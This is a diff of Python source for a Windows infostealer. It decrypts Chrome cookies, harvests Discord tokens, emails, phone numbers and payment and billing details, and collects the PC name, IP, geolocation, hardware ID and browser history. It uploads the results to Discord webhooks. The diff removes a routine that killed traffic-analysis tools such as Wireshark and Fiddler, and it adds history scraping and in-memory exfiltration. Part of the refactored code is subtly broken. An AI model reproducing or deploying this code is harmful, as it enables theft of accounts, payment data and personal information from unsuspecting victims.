@@ -1,5 +1,5 @@
 import json
-import os
+import os, io
 import sys
 from json import loads
 from base64 import b64decode
@@ -16,29 +16,8 @@ from re import findall, search
 import win32con
 from win32api import SetFileAttributes
 import browser_cookie3
-from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
-
-try:        
-    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
-
-    class scare:
-
-        def fuck(names):
-            for proc in process_iter():
-                try:
-                    for name in names:
-                        if name.lower() in proc.name().lower():
-                            proc.kill()
-                except (NoSuchProcess, AccessDenied, ZombieProcess):
-                    pass
-
-        def crow():
-            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
-            return scare.fuck(names=forbidden)
-        
-    scare.crow()
-except:
-    pass
+from browser_history import get_history
+from prettytable import PrettyTable
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -72,7 +51,49 @@ def cookies_grabber_mod(u):
             cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
         except:
             pass
-        return cookies
+    return cookies
+
+def get_Personal_data():
+    hwid = get_hwid()
+    pc_username = os.getenv('UserName')
+    pc_name = os.getenv('COMPUTERNAME')
+    try:
+        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
+        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
+        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
+    except:
+        city="City not found -_-"
+        country="Country not found -_-"
+        ip_address="No IP found -_-"
+    return f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"
+
+def find_His():
+    table = PrettyTable(padding_width=1)
+    table.field_names = ["CurrentTime", "Link"]
+    for his in get_history().histories:
+        a, b = his
+        if len(b) <= 100:
+            table.add_row([a, b])
+        else:
+            x_= b.split("//")
+            x__, x___= x_[1].count('/'), x_[1].split('/')
+            if x___[0] != 'www.google.com':
+                if x__ <= 5:
+                    b = f"{x_[0]}//"
+                    for p in x___:
+                        if x___.index(p) != len(x___) - 1:
+                            b += f"{p}/"
+                    if len(b) <= 100:
+                        table.add_row([a, b])
+                    else:
+                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+                else:
+                    b = f"{x_[0]}//{x___[0]}/[...]"
+                    if len(b) <= 100:
+                        table.add_row([a, b]) 
+                    else:
+                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+    return table.get_string()
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -97,7 +118,7 @@ def decrypt_data(data, key):
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
-def main(DISCORD_WEBHOOK_URLs):
+def main():
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
@@ -188,19 +209,6 @@ def main(DISCORD_WEBHOOK_URLs):
                     for h in insta_lst:
                         insta_formated += f"{h}\n"
                     result.append(insta_formated)
-    hwid = get_hwid()
-    pc_username = os.getenv('UserName')
-    pc_name = os.getenv('COMPUTERNAME')
-    try:
-        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
-        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
-        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
-    except:
-        city="City not found -_-"
-        country="Country not found -_-"
-        ip_address="No IP found -_-"
-        
-    Personnal_info = f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"
     try:
         cursor.execute("""
         UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
@@ -208,12 +216,9 @@ def main(DISCORD_WEBHOOK_URLs):
         AND name = ?""", (decrypted_value, host_key, name))
     except:
         pass
-    with open(f"Cooked_data.txt", "a") as f:
-        SetFileAttributes('Cooked_data.txt', win32con.FILE_ATTRIBUTE_HIDDEN)
-        data = ''
-        for r in result:
-            data += f"{r}\n"
-        f.write(data)
+    data = ''
+    for r in result:
+        data += f"{r}\n"
     all_data, all_data_p, lst, lst_b = [], [], '', ''
     for x in tokens:
         try:
@@ -236,41 +241,41 @@ def main(DISCORD_WEBHOOK_URLs):
                         all_data_p.append(writable_2)
         except:
             pass
-    with open(f"Cooked_data.txt", "a") as f:
-        f.write("DISCORD ACCOUNT INFO FOUNDED:\n\n")
-        for g in all_data:
-            f.write(f"""\nPseudo: {all_data[all_data.index(g)][0]}\nDiscord email: {all_data[all_data.index(g)][1]}\nDiscord phone num: {all_data[all_data.index(g)][2]}
-            \n=====================================================""")
-        def discord_info_w(x, y):
-            f.write(f"""Billings Adress:\n{all_data_p[x][y]['name']}\n{all_data_p[x][y]['line_1']}\n{all_data_p[x][y]['line_2']}
-            \nCity and state: {all_data_p[x][y]['city']} - {all_data_p[x][y]['state']}\nCountry: {all_data_p[x][y]['country']}\nPostal Code: {all_data_p[x][y]['postal_code']}
-            \n=====================================================\n""")
-        f.write("\nDISCORD PAYMENT INFO FOUNDED:\n")
-        for b in all_data_p:
-            m = all_data_p.index(b)
-            if all_data_p[m][1] == 1:
-                f.write(f"Provider: {all_data_p[m][0]}\nLast_4: {all_data_p[m][2]}\nExpire: {all_data_p[m][3]}/{all_data_p[m][4]}\n-------------------------------\n")
-                discord_info_w(m, 5)
-            elif all_data_p[m][1] == 2:
-                f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
-                discord_info_w(m, 2)
-    for URL in DISCORD_WEBHOOK_URLs:
-        webhook = DiscordWebhook(url=URL, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
-        with open("Cooked_data.txt", "rb") as f:
-            webhook.add_file(file=f.read(), filename='data.txt')
-        webhook.execute()
-    
-        db.commit()
-        db.close()
+    data += "DISCORD ACCOUNT INFO FOUNDED:\n\n"
+    for g in all_data:
+        data += f"""\nPseudo: {all_data[all_data.index(g)][0]}\nDiscord email: {all_data[all_data.index(g)][1]}\nDiscord phone num: {all_data[all_data.index(g)][2]}
+        \n====================================================="""
+    def discord_info_w(x, y):
+        data += f"""Billings Adress:\n{all_data_p[x][y]['name']}\n{all_data_p[x][y]['line_1']}\n{all_data_p[x][y]['line_2']}
+        \nCity and state: {all_data_p[x][y]['city']} - {all_data_p[x][y]['state']}\nCountry: {all_data_p[x][y]['country']}\nPostal Code: {all_data_p[x][y]['postal_code']}
+        \n=====================================================\n"""
+    data += "\nDISCORD PAYMENT INFO FOUNDED:\n"
+    for b in all_data_p:
+        m = all_data_p.index(b)
+        if all_data_p[m][1] == 1:
+            data += f"Provider: {all_data_p[m][0]}\nLast_4: {all_data_p[m][2]}\nExpire: {all_data_p[m][3]}/{all_data_p[m][4]}\n-------------------------------\n"
+            discord_info_w(m, 5)
+        elif all_data_p[m][1] == 2:
+            data += f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n"
+            discord_info_w(m, 2)
+    db.commit()
+    db.close()
     try:
         os.remove('Cookies.db')
-        os.remove('Cooked_data.txt')
     except:
         pass
+    return data
+
+def send_webhook(DISCORD_WEBHOOK_URLs):
+    for URL in DISCORD_WEBHOOK_URLs:
+        webhook = DiscordWebhook(url=URL, content=get_Personal_data(), username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+        webhook.add_file(file=main(), filename='data.txt')
+        webhook.add_file(file=find_His(), filename='user_history.txt')
+        webhook.execute()
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
-        main(['YOUR DISCORD WEBHOOK URL'])
+        send_webhook(['YOUR DISCORD WEBHOOK URL'])
     else:
         del sys.argv[0]
-        main(sys.argv)
+        send_webhook(sys.argv)
